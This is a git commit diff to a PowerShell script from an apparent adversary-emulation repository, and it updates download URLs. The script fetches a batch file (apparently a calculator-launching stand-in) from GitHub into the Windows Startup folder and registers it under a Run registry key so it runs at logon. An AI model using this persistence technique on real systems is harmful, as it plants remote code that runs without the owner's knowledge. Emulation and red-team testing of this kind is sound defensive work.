3939741c18d0a50dea40813c51918853cb71c715
The SC CIC Repo <130778036+sccic-github@users.noreply.github.com>
2025-11-05 13:28:19 -0500

    Update URLs for startup persistence script

--- establishPersistence.ps1
+++ establishPersistence.ps1
@@ -1,10 +1,10 @@
 # StartUp Folder Persistence
-Invoke-WebRequest -uri "https://raw.githubusercontent.com/sccic-github/Adversary-Emulation/blob/main/scripts/files/startCalc.bat" -OutFile "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\startupPersistance.bat"
+Invoke-WebRequest -uri "https://raw.githubusercontent.com/sccic-github/Emulation-Scripts/refs/heads/main/startCalc.bat" -OutFile "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\startupPersistance.bat"
 
 # Run Key Persistence
 $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $keyName = "Persistence"
-Invoke-WebRequest -uri "https://raw.githubusercontent.com/sccic-github/Adversary-Emulation/blob/main/scripts/files/startCalc.bat" -OutFile "$env:USERPROFILE\AppData\Local\Temp\startupPersistance.bat"
+Invoke-WebRequest -uri "https://raw.githubusercontent.com/sccic-github/Emulation-Scripts/refs/heads/main/startCalc.bat" -OutFile "$env:USERPROFILE\AppData\Local\Temp\startupPersistance.bat"
 $calcPath = "$env:USERPROFILE\AppData\Local\Temp\startupPersistance.bat"
 Set-ItemProperty -Path $registryPath -Name $keyName -Value $calcPath
 
